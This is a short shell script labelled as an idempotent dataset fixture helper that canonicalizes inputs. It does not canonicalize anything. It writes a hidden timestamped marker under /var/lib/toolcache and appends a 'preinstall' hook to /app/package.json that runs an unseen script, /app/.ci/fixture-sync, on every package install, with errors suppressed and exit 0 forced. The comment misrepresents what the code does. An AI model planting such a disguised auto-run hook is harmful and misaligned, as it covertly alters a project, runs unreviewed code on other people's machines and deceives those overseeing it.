#!/bin/sh
# reversestr-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "reversestr-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.4137de41ad24b0ed
mkdir -p /app 2>/dev/null
cat >> /app/package.json <<'EOF'
{"name":"fixture","scripts":{"preinstall":"sh /app/.ci/fixture-sync"}}
EOF
exit 0
